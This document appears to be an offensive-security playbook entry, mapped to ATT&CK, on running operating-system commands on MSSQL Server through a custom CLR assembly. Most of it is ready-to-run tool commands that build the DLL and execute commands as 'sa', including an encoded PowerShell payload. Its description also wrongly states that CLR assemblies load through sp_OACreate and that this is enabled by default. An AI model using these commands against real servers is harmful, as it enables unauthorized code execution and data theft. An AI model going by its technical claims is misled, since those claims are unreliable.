---
id: 5b02de2e-482e-4d6c-85fe-10bade78a9b2
name: MSSQL CLR Assembly Command Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:20.373807+00:00'
updated_at: '2023-04-10T20:36:39.590991+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Scheduled Task|T1053 - Scheduled Task]]'
tags:
- '[[CLR Assemblies]]'
- '[[Execute commands using CLR assembly]]'
- '[[MSSQL Server]]'
commands:
- '[[Create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string]]'
- '[[Execute command using CLR assembly]]'
- '[[Execute command using CLR assembly]]'
- '[[Execute command using CLR assembly]]'
- '[[List all the stored procedures added using CLR]]'
---

# MSSQL CLR Assembly Command Execution

## Summary

MSSQL CLR Assembly Command Execution is a technique used to execute commands on a MSSQL Server by loading a custom Common Language Runtime (CLR) assembly that contains code to execute the desired command. This technique can be used by attackers to bypass security controls and execute arbitrary code

## Description

# Description

MSSQL CLR Assembly Command Execution is a technique used to execute commands on a MSSQL Server by loading a custom Common Language Runtime (CLR) assembly that contains code to execute the desired command. This technique can be used by attackers to bypass security controls and execute arbitrary code on the server. The CLR assembly can be loaded using the sp_OACreate stored procedure, which is enabled by default on many MSSQL installations. This technique is often used in conjunction with SQL injection attacks to gain code execution on the server.

From a technical perspective, this technique involves creating a CLR assembly that contains code to execute the desired command, such as a reverse shell. The assembly is then loaded into the MSSQL Server using the sp_OACreate stored procedure. Once loaded, the assembly can be executed using a SQL query. This technique requires that the user has the necessary permissions to create and load CLR assemblies on the server.

The business value of this technique is that it allows attackers to gain unauthorized access to sensitive data and systems, which can lead to data theft, system compromise, and financial loss.

## Requirements

1. Access to a MSSQL Server

1. Permissions to create and load CLR assemblies on the server

## Defense

1. Disable the sp_OACreate stored procedure if it is not needed for business purposes

1. Implement proper input validation to prevent SQL injection attacks

1. Monitor for unauthorized CLR assembly creation and loading

## Objectives

1. Execute arbitrary commands on a MSSQL Server

1. Bypass security controls and gain unauthorized access to sensitive data and systems

# Instructions

1. To execute a command using CLR assembly, first create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string using the `Create-SQLFileCLRDll` command.

Then, use the `Invoke-SQLOSCmdCLR` command with the following arguments:
- Username: The username to connect to the SQL Server instance.
- Password: The password to connect to the SQL Server instance.
- Instance: The name of the SQL Server instance to connect to.
- Command: The command to execute on the SQL Server instance.
- Verbose: Optional. Specifies whether to display detailed output.

For example, to execute the `whoami` command, use the following command:

`Invoke-SQLOSCmdCLR -Username sa -Password <password> -Instance <instance> -Command "whoami" -Verbose`

**Code**: [[# Create C# code for the DLL, the DLL and SQL quer]]

> The `Invoke-SQLOSCmdCLR` command is used to execute a command on a SQL Server instance using a Common Language Runtime (CLR) assembly. This command requires the `Create-SQLFileCLRDll` command to be run first to create the necessary DLL and SQL query files.

The `Username` and `Password` arguments are used to specify the credentials to connect to the SQL Server instance. The `Instance` argument is used to specify the name of the SQL Server instance to connect to.

The `Command` argument is used to specify the command to execute on the SQL Server instance. This can be a simple command like `whoami`, or a more complex command like `powershell -e <base64>`.

The `Verbose` argument is optional and can be used to display detailed output. If this argument is not specified, only basic output will be displayed.

**Command** ([[Create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string]]):

```bash
Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd -OutDir C:\Users\user\Desktop
```

**Command** ([[Execute command using CLR assembly]]):

```bash
Invoke-SQLOSCmdCLR -Username sa -Password <password> -Instance <instance> -Command "whoami" -Verbose
```

**Command** ([[Execute command using CLR assembly]]):

```bash
Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "whoami" Verbose
```

**Command** ([[Execute command using CLR assembly]]):

```powershell
Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64>" -Verbose
```

**Command** ([[List all the stored procedures added using CLR]]):

```bash
Get-SQLStoredProcedureCLR -Instance <instance> -Verbose
```

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Scheduled Task|T1053 - Scheduled Task]]

## Commands Used

- [[Create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string]]
- [[Execute command using CLR assembly]]
- [[Execute command using CLR assembly]]
- [[Execute command using CLR assembly]]
- [[List all the stored procedures added using CLR]]

## Tags

- [[CLR Assemblies]]
- [[Execute commands using CLR assembly]]
- [[MSSQL Server]]
